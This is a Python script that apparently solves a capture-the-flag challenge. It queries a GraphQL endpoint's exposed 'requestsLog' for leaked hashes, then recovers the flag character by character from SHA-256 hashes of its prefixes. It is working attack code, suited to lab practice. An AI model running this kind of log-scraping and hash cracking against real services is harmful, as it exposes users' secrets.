import requests
import json
import hashlib

FLAG = ""
URL = "https://confessions.geographer.fr/graphql"

printable_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}'


def unHash(target):
    global FLAG
    for char in printable_chars:
        testing_hash = hashlib.sha256((FLAG + char).encode('utf-8')).hexdigest()
        if testing_hash == target:
            print("\r4. find the FLAG -> " + FLAG + char, end="")
            FLAG = FLAG + char
            break


def requestLogs():
    global URL
    print("1. Requesting logs...")
    payload = '{"query":"query ExampleQuery {\\n  requestsLog {\\n    timestamp\\n    name\\n    args\\n  }\\n}\\n","variables":{}}'
    headers = {
        "Content-Type": "application/json",
    }

    return requests.request("POST", URL, headers=headers, data=payload).text


def main():
    logs = requestLogs()
    targeted_hashes = []
    print("2. Parsing logs...")

    for log in json.loads(logs)["data"]["requestsLog"]:
        if log.get("args") and "hash" in log.get("args"):
            targeted_hashes.append(log.get("args")[9:-2])

    print("3. Unhash targeted hashes...\n")
    for hash in targeted_hashes:
        unHash(hash)

    print("\n")

if __name__ == "__main__":
    main()